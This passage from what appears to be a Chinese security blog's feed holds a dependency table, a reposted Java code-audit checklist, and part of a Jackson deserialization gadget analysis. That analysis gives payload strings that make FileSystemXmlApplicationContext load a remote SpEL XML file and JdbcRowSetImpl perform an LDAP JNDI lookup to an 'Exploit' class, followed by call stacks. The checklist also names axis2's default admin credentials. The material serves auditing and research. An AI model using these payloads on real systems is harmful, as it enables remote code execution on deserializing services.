style="text-align:left">poi-ooxml-3.6-20091214.jar</td><td style="text-align:left">提供对office的word、excel、visio及ppt的操作</td></tr><tr><td style="text-align:left">poi-ooxml-schemas-3.6-20091214.jar</td><td style="text-align:left">提供对office的word、excel、visio及ppt的操作</td></tr><tr><td style="text-align:left">poi-scratchpad-3.1-FINAL-20080629.jar</td><td style="text-align:left">提供对office的word、excel、visio及ppt的操作</td></tr><tr><td style="text-align:left">processCommon.jar</td><td style="text-align:left">IBM</td></tr><tr><td style="text-align:left">ProcessCommonLibrary.jar</td><td style="text-align:left">IBM</td></tr><tr><td style="text-align:left">processIdentity.jar</td><td style="text-align:left">IBM</td></tr><tr><td style="text-align:left">ProcessInformation.jar</td><td style="text-align:left">进程监视软件包</td></tr><tr><td style="text-align:left">proxool-0.9.1.jar</td><td style="text-align:left">数据库连接池</td></tr><tr><td style="text-align:left">proxool-cglib.jar</td><td style="text-align:left">数据库连接池</td></tr><tr><td style="text-align:left">quartz-1.6.0.jar</td><td style="text-align:left">开源作业调度框架</td></tr><tr><td style="text-align:left">saaj-api-1.3.jar</td><td style="text-align:left">使用axis所需的jar</td></tr><tr><td style="text-align:left">saaj-impl-1.3.2.jar</td><td style="text-align:left">使用axis所需的jar</td></tr><tr><td style="text-align:left">serializer-2.7.1.jar</td><td style="text-align:left">XML序列化</td></tr><tr><td style="text-align:left">slf4j-jdk14-1.5.6.jar</td><td style="text-align:left">整合各种日志框架的工具</td></tr><tr><td style="text-align:left">spring208.jar</td><td style="text-align:left">spring核心框架</td></tr><tr><td style="text-align:left">spring-ldap-1.2-RC1.jar</td><td style="text-align:left">spring下LDAP</td></tr><tr><td style="text-align:left">spring-mock.jar</td><td style="text-align:left">spring的测试框架</td></tr><tr><td style="text-align:left">standard.jar</td><td style="text-align:left">使用JSTL标签库所需的jar</td></tr><tr><td style="text-align:left">stax-api-1.0.1.jar</td><td style="text-align:left">解析XML</td></tr><tr><td style="text-align:left">struts2-core-2.0.14.jar</td><td style="text-align:left">struts2核心jar</td></tr><tr><td style="text-align:left">struts2-spring-plugin-2.0.6.jar</td><td style="text-align:left">struts2整合Spring所需jar</td></tr><tr><td style="text-align:left">taglibs-datetime.jar</td><td style="text-align:left">Apache开源组织提供标签库，用于格式化日期。</td></tr><tr><td style="text-align:left">taglibs-mailer.jar</td><td style="text-align:left">用于发送邮件</td></tr><tr><td style="text-align:left">taglibs-string.jar</td><td style="text-align:left">Apache开源组织提供标签库，用于对String的操作。</td></tr><tr><td style="text-align:left">task137650.jar</td><td style="text-align:left">Portal技术在SOA系统集成应用中实现所需的jar</td></tr><tr><td style="text-align:left">utility.jar</td><td style="text-align:left">Apache开源组织提供标签库</td></tr><tr><td style="text-align:left">velocity-1.5.jar</td><td style="text-align:left">一个免费的开源模板框架</td></tr><tr><td style="text-align:left">wsdl4j-1.6.2.jar</td><td style="text-align:left">用来解析服务的WSDl文件</td></tr><tr><td style="text-align:left">wss4j-1.5.4.jar</td><td style="text-align:left">创建CXF所需jar</td></tr><tr><td style="text-align:left">wss4j-1.5.4.jar</td><td style="text-align:left">创建CXF所需jar</td></tr><tr><td style="text-align:left">wstx-asl-3.2.6.jar</td><td style="text-align:left">创建CXF所需jar</td></tr><tr><td style="text-align:left">xbean-spring-2.8.jar</td><td style="text-align:left">使用xfire所需jar</td></tr><tr><td style="text-align:left">xerces-2.6.2.jar</td><td style="text-align:left">XML解析器</td></tr><tr><td style="text-align:left">xfire-all-1.2.6.jar</td><td style="text-align:left">用于实现WebService</td></tr><tr><td style="text-align:left">XmlSchema-1.1.jar</td><td style="text-align:left">使用xfire所需jar</td></tr><tr><td style="text-align:left">xwork-2.0.7.jar</td><td style="text-align:left">WebWork核心jar</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>（转）Java代码审计指南</title>
    <link href="https://www.mi1k7ea.com/2019/11/25/%EF%BC%88%E8%BD%AC%EF%BC%89Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%8C%87%E5%8D%97/"/>
    <id>https://www.mi1k7ea.com/2019/11/25/（转）Java代码审计指南/</id>
    <published>2019-11-25T14:20:15.000Z</published>
    <updated>2019-11-27T14:23:36.460Z</updated>
    
    <content type="html"><![CDATA[<p>转自：<a href="http://blog.nsfocus.net/code-audit-instruction/" target="_blank" rel="noopener">http://blog.nsfocus.net/code-audit-instruction/</a></p><h2 id="一、测试工具"><a href="#一、测试工具" class="headerlink" title="一、测试工具"></a>一、测试工具</h2><h3 id="1-1-反编译java类"><a href="#1-1-反编译java类" class="headerlink" title="1.1 反编译java类"></a>1.1 反编译java类</h3><p>如果项目中未提供所有java源代码，只提供编译后的class文件，可以运行jd-gui，选择菜单File—Open File，对class文件进行反编译</p><p><img src="/2019/11/25/（转）Java代码审计指南/1.png" alt=""></p><p><img src="/2019/11/25/（转）Java代码审计指南/2.png" alt=""></p><p>选择class文件或者jar包，点击打开按钮，即可查看反汇编后的java源代码</p><p><img src="/2019/11/25/（转）Java代码审计指南/3.png" alt=""></p><h3 id="1-2-Eclipse环境审计"><a href="#1-2-Eclipse环境审计" class="headerlink" title="1.2 Eclipse环境审计"></a>1.2 Eclipse环境审计</h3><p>使用Eclipse的Import功能将程序代码导入workspace，打开任一java源文件，选择Source Analyse菜单下的条目进行关键方法搜索，搜索结果在窗口下面显示，然后进行人工分析。</p><p><img src="/2019/11/25/（转）Java代码审计指南/4.png" alt=""></p><h2 id="二、认证管理"><a href="#二、认证管理" class="headerlink" title="二、认证管理"></a>二、认证管理</h2><h3 id="2-1-图形验证码"><a href="#2-1-图形验证码" class="headerlink" title="2.1 图形验证码"></a>2.1 图形验证码</h3><ul><li>用户登录过程是否有图形验证码保护，防止自动化程序猜测密码</li><li>验证码复杂度是否符合要求（干扰、变形）</li><li>验证码在使用过一次后是否会自动刷新</li><li>验证码明文是否会被传送给客户端（页面或Cookie）</li><li>验证码是否在被保护的操作进行前来验证（无验证或无效验证）</li></ul><h3 id="2-2-认证实现"><a href="#2-2-认证实现" class="headerlink" title="2.2 认证实现"></a>2.2 认证实现</h3><ul><li>用户认证过程中，用户名和密码合法性的检查方式是否符合要求</li></ul><p>较安全的做法为先校验验证码，再检查用户名，最后比对密码的密文</p><ul><li>是否具备用户注销功能</li></ul><p>用户注销时是否清理了当前用户会话</p><ul><li>是否会将密码作为重定向的一部分进行传送</li></ul><p>在统一认证SSO模式下，有的实现并非使用Token来交换认证信息，而是通过客户端直接传递账号、密码，这种情形下有可能在URL中直接传递明文密码。</p><ul><li>认证过程中对于用户名错误和密码错误提示是否相同</li></ul><p>统一用户名和密码错误提示，可以降低账号、密码被猜解的风险</p><ul><li>检查用户认证页面是否对认证失败的次数进行了限制</li></ul><h2 id="三、授权管理"><a href="#三、授权管理" class="headerlink" title="三、授权管理"></a>三、授权管理</h2><h3 id="3-1-授权实现"><a href="#3-1-授权实现" class="headerlink" title="3.1 授权实现"></a>3.1 授权实现</h3><ul><li>应用的用户是否具有角色的区分</li></ul><p>明确用户的角色定义、授权访问的范围，分析哪种情况下可能会导致越权</p><ul><li>应用是否具备统一的（或独立）的权限控制模块</li></ul><p>大部分的大型应用都会采用统一的权限控制模块</p><ul><li>应用的权限控制模块是否存在漏洞</li><li>页面/功能是否使用了权限控制（模块）</li></ul><p>识别出需要和无需权限控制的页面/功能，逐一进行验证。验证过程中需要考虑到用户的角色划分。</p><ul><li>页面的权限控制是否正确</li></ul><p>部分应用的权限控制（模块）的使用上存在缺陷，攻击者可能通过一些隐蔽的途径绕过鉴权，访问非授权资源</p><h3 id="3-2-授权管理"><a href="#3-2-授权管理" class="headerlink" title="3.2 授权管理"></a>3.2 授权管理</h3><ul><li>高权限用户分析</li></ul><p>分析系统高权限用户（例如：管理员用户）的分配情况及密码复杂度等</p><ul><li>默认用户分析</li></ul><p>分析系统是否存在默认用户、密码，密码复杂度等。</p><h2 id="四、输入-输出验证"><a href="#四、输入-输出验证" class="headerlink" title="四、输入/输出验证"></a>四、输入/输出验证</h2><h3 id="4-1-SQL注入防护"><a href="#4-1-SQL注入防护" class="headerlink" title="4.1 SQL注入防护"></a>4.1 SQL注入防护</h3><ul><li>是否存在全局过滤器</li></ul><p>过滤器配置、过滤函数等</p><ul><li>过滤器是否可以过滤所有查询请求</li></ul><p>请求是否都按要求经过过滤器处理</p><ul><li>过滤器的过滤是否符合要求</li></ul><p>初期检查可以依据PHPIDS的规则库，后期根据收集的情况予以补充</p><ul><li>是否使用了预查询机制</li></ul><p>预查询是指在将数据传入SQL语句前明确指定传输数据的类型，以执行必要的转换。在Java中预查询的调用方式为prepareStatement。</p><ul><li>是否存在SQL语句拼接</li></ul><p>某些特殊的查询（特别复杂的组合查询）难免用到SQL语句拼接，遇到这种情况，就需要检查拼接是否有可能导致注入。</p><h3 id="4-2-跨站攻击防护"><a href="#4-2-跨站攻击防护" class="headerlink" title="4.2 跨站攻击防护"></a>4.2 跨站攻击防护</h3><ul><li>是否存在全局XSS过滤器(论坛的过滤库)</li><li>过滤器的过滤是否符合要求</li><li>是否存在需过滤和不需过滤两种输出，页面是否控制恰当（*）</li></ul><p>某些情况下可能存在两种输出，文本输出和富文本（HTML）输出，要强制文本输出，只需要调用HTMLEncode()对内容进行编码后输出即可；但是富文本本身就需要使用html来进行格式的控制，简单的编码就无法使用，这时需要在此类内容从客户端输入（用户提交）或输出给客户端（显示）时进行危险代码过滤。</p><ul><li>输出的时候是否进行编码（HTML、JS）</li></ul><h3 id="4-3-CSRF攻击防护"><a href="#4-3-CSRF攻击防护" class="headerlink" title="4.3 CSRF攻击防护"></a>4.3 CSRF攻击防护</h3><ul><li>Web表单是否使用了Token（或验证码）</li><li>Web表单提交（成功或不成功）后token（或验证码）是否重置</li><li>检查Token的生成算法是否安全</li></ul><p>可以从测试环境来检查生成的验证码是否符合复杂性要求，如是否有干扰线/点、字符变形等。</p><ul><li>检查服务器获取Web表单参数值的方式</li></ul><p>如果在操作时不严格区分GET和POST，在没有Token（或验证码）的辅助下很容易导致CSRF的发生。</p><h3 id="4-4-文件上传防护"><a href="#4-4-文件上传防护" class="headerlink" title="4.4 文件上传防护"></a>4.4 文件上传防护</h3><ul><li>是否限制了上传文件的扩展名</li></ul><p>以白名单形式指定允许上传的扩展名；以黑名单形式指定禁止上传的文件名</p><ul><li>是否对上传文件进行了重命名操作</li></ul><p>重命名操作是否安全，防止重命名过程中产生二次风险</p><ul><li>是否对上传文件的存放位置禁止了脚本执行</li></ul><h3 id="4-5-文件下载防护"><a href="#4-5-文件下载防护" class="headerlink" title="4.5 文件下载防护"></a>4.5 文件下载防护</h3><ul><li>是否存在客户端指定文件名的下载功能</li><li>直接指定文件名的下载是否允许客户端指定路径</li><li>对于不同用户的文件在下载时是否进行了权限控制</li></ul><p>文件下载功能中是否对用户的权限进行了检查。</p><h3 id="4-6-重定向与转发保护"><a href="#4-6-重定向与转发保护" class="headerlink" title="4.6 重定向与转发保护"></a>4.6 重定向与转发保护</h3><ul><li>是否具有客户端控制的重定向或转发</li><li>是否定义了重定向的信任域名或主机列表</li><li>是否对客户端的重定向或转发请求进行检查</li></ul><h2 id="五、会话管理"><a href="#五、会话管理" class="headerlink" title="五、会话管理"></a>五、会话管理</h2><h3 id="5-1-Session管理"><a href="#5-1-Session管理" class="headerlink" title="5.1 Session管理"></a>5.1 Session管理</h3><ul><li>session信息是否放在url里面</li></ul><p>通过应用服务器的配置检查</p><ul><li>执行业务功能时，是否检查了当前用户session身份</li></ul><p>从代码部分、从配置部分检查，需要根据应用实际使用的验证方式</p><ul><li>成功登陆之后是否会更新SessionID</li></ul><p>认证成功后是否强制刷新用户使用的SessionID</p><ul><li>session是否有超时注销功能</li></ul><p>检查Session的超时时间设置是否符合要求，默认是20~30分钟</p><h3 id="5-2-Cookie管理"><a href="#5-2-Cookie管理" class="headerlink" title="5.2 Cookie管理"></a>5.2 Cookie管理</h3><ul><li>是否会在Cookie中存储明文或简单编码/加密过的密码</li><li>是否会在Cookie中存储应用的特权标识</li><li>是否设置了Cookie的有效域和有效路径</li><li>是否设置了合适的Cookie有效时间</li></ul><p>如果生存时间在20~30分钟左右，使用Session方式会更加安全</p><h2 id="六、密码管理"><a href="#六、密码管理" class="headerlink" title="六、密码管理"></a>六、密码管理</h2><h3 id="6-1-加密安全"><a href="#6-1-加密安全" class="headerlink" title="6.1 加密安全"></a>6.1 加密安全</h3><ul><li>密码是否以不可逆的哈希形态存储</li><li>是否使用不带salt的哈希算法来加密密码</li><li>加密哈希算法中的salt是否硬编码在代码中</li></ul><h3 id="6-2-密码安全"><a href="#6-2-密码安全" class="headerlink" title="6.2 密码安全"></a>6.2 密码安全</h3><ul><li>认证过程中传输的密码是否进行了加密处理</li></ul><p>可以采用哈希算法或者RSA等加密算法将密码加密后传递，或者是使用SSL来做传输层加密。</p><ul><li>修改密码功能是否进行了旧密码的验证或者是安全问题的确认</li><li>找回密码功能是否借用第三方途径</li></ul><p>第三方途径主要有电子邮件、手机短信等。这些途径应该是找回密码前预留的。</p><ul><li>找回密码功能是否采用验证码确认并重设机制</li></ul><p>部分应用的找回密码功能是直接将原密码发送到密码保护邮箱，这种方式存在一定的安全风险。</p><ul><li>检查密码设置页面是否对密码复杂度进行检查</li></ul><p>至少包含数字和字母，长度最少6位，避免用户输入弱口令</p><h2 id="七、调试-amp-接口"><a href="#七、调试-amp-接口" class="headerlink" title="七、调试&amp;接口"></a>七、调试&amp;接口</h2><h3 id="7-1-异常处理"><a href="#7-1-异常处理" class="headerlink" title="7.1 异常处理"></a>7.1 异常处理</h3><ul><li>是否捕获了应用出现的错误并阻止其输出给客户端</li></ul><p>详细的错误输出可能会导致SQL查询泄露、程序源代码泄露、物理路径泄露等。</p><ul><li>异常处理是否能够全面覆盖所有异常行为</li><li>异常处理是否会导致程序流程异常，引发安全问题</li></ul><p>备注：某些异常可能是致命的，但是如果程序捕获了异常，可能会导致程序绕过一些重要的步骤而直接执行后续的操作。</p><h3 id="7-2-数据接口"><a href="#7-2-数据接口" class="headerlink" title="7.2 数据接口"></a>7.2 数据接口</h3><ul><li>接口服务是否存在安全漏洞</li><li>接口服务后台登录是否存在弱密码</li></ul><p>例如：axis2，<a href="http://localhost:8080/axis2/axis2-admin/，默认用户名/密码：admin/axis2，密码在webapps\axis2\WEB-INF\conf\axis2.xml里配置" target="_blank" rel="noopener">http://localhost:8080/axis2/axis2-admin/，默认用户名/密码：admin/axis2，密码在webapps\axis2\WEB-INF\conf\axis2.xml里配置</a></p><ul><li>接口服务是否有默认的测试页面</li></ul><p>例如：axis2，<a href="http://localhost:8080/axis2/axis2-web/HappyAxis.jsp，会暴露物理路径" target="_blank" rel="noopener">http://localhost:8080/axis2/axis2-web/HappyAxis.jsp，会暴露物理路径</a></p><ul><li>接口服务应用是否包含身份认证，认证的帐号、密码（或密钥）的存储安全</li></ul><p>例如：使用WSS4J对SOAP报文体进行身份认证</p><ul><li>接口服务应用传输是否加密</li></ul><p>例如：使用WSS4J对SOAP报文体进行加密</p><ul><li>接口服务应用异常处理</li></ul><p>例如：Webservice应用对特殊字符的处理，是否会在报错信息中泄露数据，参考<a href="http://www.soapui.org/About-SoapUI/features.html#security-testing" target="_blank" rel="noopener">http://www.soapui.org/About-SoapUI/features.html#security-testing</a></p><h3 id="7-3-硬编码"><a href="#7-3-硬编码" class="headerlink" title="7.3 硬编码"></a>7.3 硬编码</h3><ul><li>代码中是否存在内置的敏感信息</li></ul><p>如：调试帐号、外部接口帐号/密码、数据加/解密密钥等</p><h2 id="八、日志审计"><a href="#八、日志审计" class="headerlink" title="八、日志审计"></a>八、日志审计</h2><h3 id="8-1-日志记录"><a href="#8-1-日志记录" class="headerlink" title="8.1 日志记录"></a>8.1 日志记录</h3><ul><li>应用是否会将用户密码记入日志</li><li>日志记录的内容是否合理，避免日志文件增长过快，造成磁盘空间不足</li></ul><h2 id="九、运行环境"><a href="#九、运行环境" class="headerlink" title="九、运行环境"></a>九、运行环境</h2><h3 id="9-1-应用配置"><a href="#9-1-应用配置" class="headerlink" title="9.1 应用配置"></a>9.1 应用配置</h3><ul><li>是否删除了不必要的网页、帐号及权限</li></ul><p>页面包括应用服务器的默认页面、管理后台、测试页面、备份文件等；帐号指Web应用服务器的运行帐户</p><ul><li>目录浏览是否被禁用</li><li>Web容器默认帐户的密码是否更改或禁用</li><li>不能删除的管理后台是否启用了密码保护</li><li>正式发布的应用是否包含开发调试文件、代码</li></ul><p>如SVN版本信息文件、调试工具/页面、功能模块中的调试接口等</p><ul><li>重要的配置信息是否进行了加密</li></ul><p>如数据库连接配置、其它接口连接配置等</p><h3 id="9-2-自定义错误"><a href="#9-2-自定义错误" class="headerlink" title="9.2 自定义错误"></a>9.2 自定义错误</h3><ul><li>是否自定义了403、404、500错误页面</li><li>错误页面是否会输出详细错误信息</li></ul><h3 id="9-3-日志管理"><a href="#9-3-日志管理" class="headerlink" title="9.3 日志管理"></a>9.3 日志管理</h3><ul><li>服务器是否开启了用户访问日志的记录</li><li>记录的日志是否满足问题回溯的要求</li></ul><p>是否记录了客户端地址、请求的方法、请求的URL、提交的参数（GET、POST、COOKIE参数）、请求的状态等</p><h2 id="十、第三方组件"><a href="#十、第三方组件" class="headerlink" title="十、第三方组件"></a>十、第三方组件</h2><p>分析应用使用的框架及引用的第三方组件，分析其是否存在各种已知漏洞，且当前环境漏洞是否可以重现</p><h3 id="10-1-框架"><a href="#10-1-框架" class="headerlink" title="10.1 框架"></a>10.1 框架</h3><ul><li>Struts/Struts 2</li><li>Turbine</li><li>Spring MVC</li><li>Hibernate</li><li>iBatis</li><li>DotNetNuke</li></ul><h3 id="10-2-编辑器"><a href="#10-2-编辑器" class="headerlink" title="10.2 编辑器"></a>10.2 编辑器</h3><ul><li>CKEditor/FCKEditor</li><li>eWebeditor</li><li>NicEdit</li><li>Free Rich Text Editor</li></ul><h3 id="10-3-上传组件"><a href="#10-3-上传组件" class="headerlink" title="10.3 上传组件"></a>10.3 上传组件</h3><ul><li>SmartUpload</li></ul><h3 id="10-4-安全功能"><a href="#10-4-安全功能" class="headerlink" title="10.4 安全功能"></a>10.4 安全功能</h3><h2 id="十一、安全功能"><a href="#十一、安全功能" class="headerlink" title="十一、安全功能"></a>十一、安全功能</h2><p>对于比较重要的业务系统，例如：支付系统，可以参考以下条目，进行检测</p><h3 id="11-1-登录认证"><a href="#11-1-登录认证" class="headerlink" title="11.1 登录认证"></a>11.1 登录认证</h3><ul><li>重要系统是否使用了双因素登录认证，例如：数字证书，支付盾，密保卡等，防止用户密码泄露导致系统被非法登录</li><li>重要系统是否使用了安全控件，对用户提交的关键数据进行加密</li><li>重要系统的后台管理界面是否限制了访问源地址</li><li>系统的密码重置等短信发送等功能的使用频率是否进行了限制，例如：一个手机号一分钟只能发送一条短信，防止被恶意利用多次发送短信</li><li>用户登录时的用户名，状态，源地址等关键信息需要记录到应用日志中，管理员可以进行查询</li><li>如果用户在不常用的地址登录，系统会提示用户，并显示上一次登录的源地址</li><li>对于多次密码错误的登录尝试，系统能否检测，禁止源地址访问10分钟，管理员登录后可以看到，也可以进行查询</li></ul><h3 id="11-2-数据操作"><a href="#11-2-数据操作" class="headerlink" title="11.2 数据操作"></a>11.2 数据操作</h3><ul><li>系统中大数据量查询等影响系统负载的功能是否进行了查询范围限制，例如：只能查询最近3个月的数据</li><li>系统中大数据量查询等影响系统负载的功能是否进行了查询频率限制，例如：一分钟内只能查询一次</li><li>高可用性要求的系统中是否有用户请求频率检测，超过访问阈值时，需要用户输入页面上的图形验证码，才能进一步操作</li><li>对报表查询等涉及大量数据的读取和导出操作，是否严格限制了查询范围，必要时可以使用双用户认证，限制单个用户大量读取业务数据的能力</li><li>业务关键数据的读取页面，是否使用静态密码、手机动态密码等二次验证，防止敏感数据泄露，例如：交易详单的查询</li><li>业务处理过程中用户身份等关键识别信息，是否保存在服务端，禁止从客户端提交</li><li>业务处理过程中关键操作需要用户确认和图形验证码，手机动态验证码等保护，防止重放攻击，例如：转账操作等</li><li>关键业务操作需要记录到应用日志中，可以设置阈值，超过系统会告警，管理员可以进行查询。例如：转账金额大于20万的交易记录</li><li>涉及资金的业务用户可以设置上限，例如：用户可以设置每日最高消费限额，并在转账</li><li>关键业务操作可以设置短信提醒，例如：用户进行资金转账，进行详单查询等</li></ul>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Jackson系列七——其他Gadgets与检测防御</title>
    <link href="https://www.mi1k7ea.com/2019/11/24/Jackson%E7%B3%BB%E5%88%97%E4%B8%83%E2%80%94%E2%80%94%E5%85%B6%E4%BB%96Gadgets/"/>
    <id>https://www.mi1k7ea.com/2019/11/24/Jackson系列七——其他Gadgets/</id>
    <published>2019-11-24T10:17:15.000Z</published>
    <updated>2019-11-26T15:46:48.274Z</updated>
    
    <content type="html"><![CDATA[<p>反序列化漏洞的利用链实在是太多了，前面都是挑了一些特别点的利用链进行了复现和调试分析，具体还有哪些以及所适用的版本看下Jackson的黑名单的设置就知道了。</p><h2 id="0x01-基于FileSystemXmlApplicationContext的利用链"><a href="#0x01-基于FileSystemXmlApplicationContext的利用链" class="headerlink" title="0x01 基于FileSystemXmlApplicationContext的利用链"></a>0x01 基于FileSystemXmlApplicationContext的利用链</h2><h3 id="复现利用"><a href="#复现利用" class="headerlink" title="复现利用"></a>复现利用</h3><p>和之前分析的ClassPathXmlApplicationContext类出自同一个包，一模一样的环境，只需要换下利用类为org.springframework.context.support.FileSystemXmlApplicationContext即可成功触发：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">"[\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://127.0.0.1/spel.xml\"]"</span>;</span><br></pre></td></tr></table></figure><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/1.png" alt=""></p><p>FileSystemXmlApplicationContext类的漏洞原理和ClassPathXmlApplicationContext类是一样的，同样是没有setter方法，只有构造函数，而该函数中的refresh()函数存在SpEL注入漏洞。</p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>和前面<a href="https://www.mi1k7ea.com/2019/11/17/Jackson%E7%B3%BB%E5%88%97%E4%B8%89%E2%80%94CVE-2017-1748%EF%BC%88%E5%9F%BA%E4%BA%8EClassPathXmlApplicationContext%E5%88%A9%E7%94%A8%E9%93%BE%EF%BC%89/">CVE-2017-17485</a>的一样，只不过换了个同一个包下的不同类而已，具体的参考之前的调试分析即可。</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">evaluate:163, StandardBeanExpressionResolver (org.springframework.context.expression)</span><br><span class="line">evaluateBeanDefinitionString:1452, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">doResolveBeanClass:1409, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">resolveBeanClass:1372, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">determineTargetType:670, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">predictBeanType:637, AbstractAutowireCapableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">isFactoryBean:1489, AbstractBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">doGetBeanNamesForType:421, DefaultListableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">getBeanNamesForType:391, DefaultListableBeanFactory (org.springframework.beans.factory.support)</span><br><span class="line">registerBeanPostProcessors:189, PostProcessorRegistrationDelegate (org.springframework.context.support)</span><br><span class="line">registerBeanPostProcessors:709, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">refresh:534, AbstractApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:142, FileSystemXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">&lt;init&gt;:85, FileSystemXmlApplicationContext (org.springframework.context.support)</span><br><span class="line">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br><span class="line">newInstance:422, Constructor (java.lang.reflect)</span><br><span class="line">call1:129, AnnotatedConstructor (com.fasterxml.jackson.databind.introspect)</span><br><span class="line">createFromString:299, StdValueInstantiator (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserializeFromString:1204, BeanDeserializerBase (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserializeOther:144, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:135, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:554, UntypedObjectDeserializer$Vanilla (com.fasterxml.jackson.databind.deser.std)</span><br><span class="line">deserialize:63, TypeWrappedDeserializer (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">_readMapAndClose:3807, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">readValue:2797, ObjectMapper (com.fasterxml.jackson.databind)</span><br><span class="line">main:11, PoC</span><br></pre></td></tr></table></figure><h2 id="0x02-基于JdbcRowSetImpl的利用链"><a href="#0x02-基于JdbcRowSetImpl的利用链" class="headerlink" title="0x02 基于JdbcRowSetImpl的利用链"></a>0x02 基于JdbcRowSetImpl的利用链</h2><h3 id="复现利用-1"><a href="#复现利用-1" class="headerlink" title="复现利用"></a>复现利用</h3><p>和Fastjson反序列化漏洞中的利用是一样的原理，都是利用JNDI注入漏洞实现反序列化漏洞的利用，不再多说，需要实现RMI服务或LDAP服务，注意JDK版本限制等：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String payload = <span class="string">"[\"com.sun.rowset.JdbcRowSetImpl\", &#123;\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true&#125;]"</span>;</span><br></pre></td></tr></table></figure><p><img src="/2019/11/24/Jackson系列七——其他Gadgets/2.png" alt=""></p><h3 id="调试分析-1"><a href="#调试分析-1" class="headerlink" title="调试分析"></a>调试分析</h3><p>参考<a href="https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90-1">Fastjson反序列化漏洞</a>对应的调试分析即可。</p><p>利用链：setDataSourceName()-&gt;..-&gt;setAutoCommit()-&gt;connect()-&gt;IntialContext.lookup()</p><p>函数调用栈如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">lookup:417, InitialContext (javax.naming)</span><br><span class="line">connect:624, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">setAutoCommit:4067, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:497, Method (java.lang.reflect)</span><br><span class="line">deserializeAndSet:97, MethodProperty (com.fasterxml.jackson.databind.deser.impl)</span><br><span class="line">vanillaDeserialize:260, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">deserialize:125, BeanDeserializer (com.fasterxml.jackson.databind.deser)</span><br><span class="line">_deserialize:110, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeTypedFromAny:68, AsArrayTypeDeserializer (com.fasterxml.jackson.databind.jsontype.impl)</span><br><span class="line">deserializeWithType:554, UntypedObjectDeserializer$Vanilla 